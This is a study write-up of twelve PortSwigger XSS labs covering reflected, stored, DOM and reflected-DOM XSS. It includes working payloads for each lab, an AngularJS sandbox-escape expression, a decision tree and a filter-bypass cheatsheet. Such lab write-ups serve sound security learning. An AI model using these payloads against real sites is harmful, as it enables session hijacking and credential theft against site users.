# Cross-Site Scripting (XSS) — PortSwigger Web Security Labs
### Week 2 | Web Exploitation Roadmap

> **Platform:** PortSwigger Web Security Academy  
> **Difficulty:** Apprentice → Practitioner  
> **Labs Completed:** 12 / 12  
> **Date:** March 2026

---

## Table of Contents

1. [What is XSS?](#what-is-xss)
2. [XSS Types Overview](#xss-types-overview)
3. [How to Identify Each Case](#how-to-identify-each-case)
4. [Lab Write-Ups](#lab-write-ups)
   - [Reflected XSS — HTML context, nothing encoded](#1-reflected-xss--html-context-nothing-encoded)
   - [Stored XSS — HTML context, nothing encoded](#2-stored-xss--html-context-nothing-encoded)
   - [DOM XSS — document.write + location.search](#3-dom-xss--documentwrite--locationsearch)
   - [DOM XSS — innerHTML + location.search](#4-dom-xss--innerhtml--locationsearch)
   - [DOM XSS — jQuery href + location.search](#5-dom-xss--jquery-href--locationsearch)
   - [DOM XSS — jQuery selector + hashchange](#6-dom-xss--jquery-selector--hashchange)
   - [Reflected XSS — attribute, angle brackets encoded](#7-reflected-xss--attribute-angle-brackets-encoded)
   - [Stored XSS — href attribute, double quotes encoded](#8-stored-xss--href-attribute-double-quotes-encoded)
   - [Reflected XSS — JavaScript string, angle brackets encoded](#9-reflected-xss--javascript-string-angle-brackets-encoded)
   - [DOM XSS — document.write inside select element](#10-dom-xss--documentwrite-inside-select-element)
   - [DOM XSS — AngularJS expression](#11-dom-xss--angularjs-expression)
   - [Reflected DOM XSS](#12-reflected-dom-xss)
5. [Key Takeaways](#key-takeaways)

---

## What is XSS?

Cross-Site Scripting (XSS) is a vulnerability that allows an attacker to inject malicious JavaScript into a web page viewed by other users. The injected script runs in the victim's browser with the same privileges as the legitimate site — enabling session hijacking, credential theft, and more.

---

## XSS Types Overview

| Type | How it works | Persists? | Server involved? |
|------|-------------|-----------|-----------------|
| **Reflected** | Input reflected immediately in server response | No | Yes |
| **Stored** | Payload saved in database, executed on every visit | Yes | Yes |
| **DOM-based** | JavaScript on the page processes input unsafely | No | No |
| **Reflected DOM** | Server echoes data → JS processes it unsafely | No | Partially |

---

## How to Identify Each Case

### Reflected XSS
**Signs:**
- Your input appears somewhere on the page after submitting a form or search
- Check the page source — find where exactly your input lands
- Test: submit `hello123` and search for it in the HTML source

**Common locations:** search bars, error messages, URL parameters reflected on page

---

### Stored XSS
**Signs:**
- Input is saved and shown to other users (comments, profiles, usernames)
- Your payload persists after page reload
- Other users' browsers execute it

**Common locations:** comment fields, user profiles, product reviews, message boards

---

### DOM-based XSS
**Signs:**
- Input never reaches the server — processed entirely in the browser
- Check JavaScript source for dangerous sinks:
  - `document.write()`
  - `innerHTML`
  - `$.attr()`, `$()` (jQuery)
  - `location.href = `
- Source is usually `location.search`, `location.hash`, or `document.referrer`

**How to find it:** Open DevTools → Sources → search for `location.search` or `location.hash`

---

### Reflected DOM XSS
**Signs:**
- Server returns your input inside a JSON response
- A script on the page reads that JSON and writes it to the DOM
- Combination of server reflection + DOM sink

---

## Lab Write-Ups

---

### 1. Reflected XSS — HTML context, nothing encoded

**Difficulty:** Apprentice  
**Vulnerability:** Input reflected directly into HTML with zero filtering

**How I identified it:**
Searched for a test string `hello` — it appeared in the page source inside a `<h1>` or paragraph tag with no encoding whatsoever.

**Payload:**
```html
<script>alert(1)</script>
```

**Result in HTML:**
```html
<h1>1 search results for '<script>alert(1)</script>'</h1>
```

**Why it works:** No sanitization at all — the browser parses the injected `<script>` tag and executes it.

---

### 2. Stored XSS — HTML context, nothing encoded

**Difficulty:** Apprentice  
**Vulnerability:** Comment field stored and reflected without encoding

**How I identified it:**
Posted a test comment with `hello` — reloaded the page and confirmed it appeared in the HTML. Then checked if HTML tags were rendered or escaped.

**Payload (in comment field):**
```html
<script>alert(1)</script>
```

**Why it works:** The comment is saved to the database and rendered raw on every page load — affecting every visitor.

---

### 3. DOM XSS — document.write + location.search

**Difficulty:** Apprentice  
**Vulnerability:** `location.search` passed to `document.write()` without sanitization

**How I identified it:**
Opened DevTools → Sources, searched for `document.write` — found it reading from `location.search` directly.

**Vulnerable code:**
```javascript
document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
```

**Payload (in URL):**
```
?search="><svg onload=alert(1)>
```

**Result in DOM:**
```html
<img src="...?searchTerms=""><svg onload="alert(1)">
```

**Why it works:** `document.write()` renders raw HTML — closing the `img` tag and injecting a new element with an event handler.

---

### 4. DOM XSS — innerHTML + location.search

**Difficulty:** Apprentice  
**Vulnerability:** `location.search` written to `innerHTML`

**How I identified it:**
Found in JavaScript: `element.innerHTML = searchQuery` — innerHTML parses HTML, making it a dangerous sink.

**Note:** `innerHTML` does NOT execute `<script>` tags — must use event-based payloads.

**Payload:**
```
?search=<img src=x onerror=alert(1)>
```

**Why it works:** `innerHTML` renders HTML elements. The `img` tag fails to load (src=x), triggering `onerror`.

---

### 5. DOM XSS — jQuery href + location.search

**Difficulty:** Apprentice  
**Vulnerability:** jQuery sets `href` attribute from `location.search`

**How I identified it:**
Found this code on the feedback page:
```javascript
$('#backLink').attr("href", 
    new URLSearchParams(location.search).get('returnPath')
);
```

The `returnPath` parameter is placed directly into a link's `href`.

**Payload (in URL):**
```
/feedback?returnPath=javascript:alert(document.cookie)
```

**Resulting HTML:**
```html
<a id="backLink" href="javascript:alert(document.cookie)">Back</a>
```

**Trigger:** Click the "Back" link.

**Why it works:** `href` accepts the `javascript:` pseudo-protocol. When clicked, the browser executes it as JavaScript.

---

### 6. DOM XSS — jQuery selector + hashchange event

**Difficulty:** Apprentice  
**Vulnerability:** jQuery `$()` selector receives user-controlled input via `location.hash`

**How I identified it:**
```javascript
$(window).on('hashchange', function() {
    var post = $('section h2:contains(' + 
        decodeURIComponent(location.hash.slice(1)) + ')');
    post.parents('article').appendTo($('.blog-list'));
});
```

jQuery's `$()` — when passed an HTML string — creates real DOM elements instead of selecting them.

**Challenge:** The `hashchange` event only fires when the hash *changes* — a static link won't trigger it.

**Exploit (delivered via Exploit Server):**
```html
<iframe 
  src="https://LAB-ID.web-security-academy.net/#"
  onload="this.src+='<img src=x onerror=print()>'">
</iframe>
```

**How it works:**
1. `iframe` loads the target page with empty hash `#`
2. `onload` fires → appends the payload to the hash
3. Hash changes → triggers `hashchange` event
4. jQuery creates the `<img>` element → `onerror` fires → `print()` executes

---

### 7. Reflected XSS — attribute, angle brackets encoded

**Difficulty:** Apprentice  
**Vulnerability:** Input reflected inside an HTML attribute with `< >` encoded

**How I identified it:**
Searched for `hello` and found in source:
```html
<input type="text" value="hello">
```
Angle brackets were encoded to `&lt;` and `&gt;` — but **double quotes were not**.

**Key insight:** I'm already *inside* an attribute — no need for `< >` to break out.

**Payload:**
```
" onmouseover="alert(1)
```

**Resulting HTML:**
```html
<input type="text" value="" onmouseover="alert(1)">
```

**Trigger:** Move the mouse over the search box.

**Why it works:** Closing the `value` attribute with `"` and injecting a new event handler — no angle brackets needed.

---

### 8. Stored XSS — href attribute, double quotes encoded

**Difficulty:** Apprentice  
**Vulnerability:** Website field in comments stored and placed in `href` — double quotes encoded

**How I identified it:**
Posted a comment with `https://test.com` in the Website field and found:
```html
<a href="https://test.com">username</a>
```
Double quotes were encoded, but the `javascript:` protocol was not filtered.

**Payload (in Website field):**
```
javascript:alert(1)
```

**Resulting HTML:**
```html
<a href="javascript:alert(1)">username</a>
```

**Trigger:** Click the author's name.

**Golden rule:** Whenever you see a Website/URL field — always test `javascript:alert(1)` first.

---

### 9. Reflected XSS — JavaScript string, angle brackets encoded

**Difficulty:** Apprentice  
**Vulnerability:** Input reflected inside a JavaScript string — `< >` encoded but single quotes are not

**How I identified it:**
Found in page source:
```javascript
var searchTerms = 'hello';
```
Single quotes were not escaped — meaning I could break out of the JS string entirely.

**Payload:**
```
'-alert(1)-'
```

**Resulting JavaScript:**
```javascript
var searchTerms = ''-alert(1)-'';
```

**Why it works:** 
- First `'` closes the string
- `-alert(1)-` uses subtraction operator to execute `alert(1)` as an expression
- Last `'` opens a new string to keep syntax valid

---

### 10. DOM XSS — document.write inside select element

**Difficulty:** Practitioner  
**Vulnerability:** `document.write()` injects into a `<select>` element via `storeId` URL parameter

**How I identified it:**
```javascript
var store = new URLSearchParams(location.search).get('storeId');
document.write('<select><option value="' + store + '">');
```

Input lands inside a `<select>` tag — need to escape it first.

**Payload (appended to product URL):**
```
&storeId=</select><img src=x onerror=alert(1)>
```

**Resulting HTML:**
```html
<select><option value=""></select>
<img src=x onerror=alert(1)>
```

**Why it works:** `</select>` closes the container, then the injected `<img>` fires its `onerror` handler.

---

### 11. DOM XSS — AngularJS expression

**Difficulty:** Practitioner  
**Vulnerability:** AngularJS `ng-app` directive on the page — input reflected inside AngularJS scope

**How I identified it:**
Found `ng-app` attribute on the `<body>` tag. This means the entire page is an AngularJS application — and `{{ }}` expressions are evaluated as JavaScript.

**Payload:**
```
{{$on.constructor('alert(1)')()}}
```

**Why not `{{alert(1)}}`?**
AngularJS has a sandbox that blocks direct function calls. This bypass uses:
- `$on` — a built-in AngularJS object
- `.constructor` — accesses the `Function` constructor
- `('alert(1)')()` — creates and immediately invokes a new function

**Rule:** Always check for `ng-app` in page source when `< >` and `"` are blocked.

---

### 12. Reflected DOM XSS

**Difficulty:** Practitioner  
**Vulnerability:** Server echoes search term in JSON response — JavaScript processes it unsafely

**How I identified it:**
The server response contained:
```json
{"results":[], "searchTerm":"hello"}
```
A script on the page parsed this JSON and passed `searchTerm` to `eval()` or `document.write()`.

The server escaped `"` → `\"` but **did NOT escape `\`**.

**The trick:** Sending `\` before `"` results in `\\"` — the backslash escapes the backslash, leaving `"` unescaped and free.

**Payload:**
```
\"-alert(1)}//
```

**How the JSON breaks:**
```javascript
// Before
{"searchTerm":"hello","results":[]}

// After
{"searchTerm":"\"- alert(1)}//","results":[]}
//                ↑ string broken, alert executes, // comments out the rest
```

**Why it works:** The `\` neutralizes the server's escape, breaking out of the JSON string context.

---

## Key Takeaways

### The XSS Decision Tree

```
Where does my input land?
│
├── Inside an HTML tag body?
│   └── Try: <script>alert(1)</script> or <img src=x onerror=alert(1)>
│
├── Inside an HTML attribute value?
│   ├── Are quotes encoded?
│   │   ├── No  → Use " to break out + add event handler
│   │   └── Yes → Try javascript: if it's a href attribute
│   └── Is it a href/src attribute?
│       └── Try: javascript:alert(1)
│
├── Inside a JavaScript string?
│   ├── Single quotes free? → Use '-alert(1)-'
│   └── Backslash free?     → Use \"-alert(1)}//
│
├── Passed to document.write() or innerHTML?
│   └── Inject HTML directly — close any wrapping tags first
│
├── Passed to jQuery $() selector?
│   └── jQuery creates HTML from strings → <img src=x onerror=alert(1)>
│
└── AngularJS page (ng-app present)?
    └── Use {{ }} expressions → {{$on.constructor('alert(1)')()}}
```

### Encoding Bypass Cheatsheet

| Filter | Bypass technique |
|--------|-----------------|
| `< >` blocked | Stay inside existing attribute or use `{{ }}` in AngularJS |
| `"` blocked | Use `'` or `javascript:` in href |
| `'` blocked | Use `"` or HTML entities |
| `< > "` all blocked | AngularJS expressions, JS string injection |
| JSON string escaped | Try `\` to neutralize the escape |

---

*Write-up by [obadahamed](https://obadahamed.github.io) — Week 2 of 52-Week Pentesting Roadmap*  
*All labs solved on PortSwigger Web Security Academy*
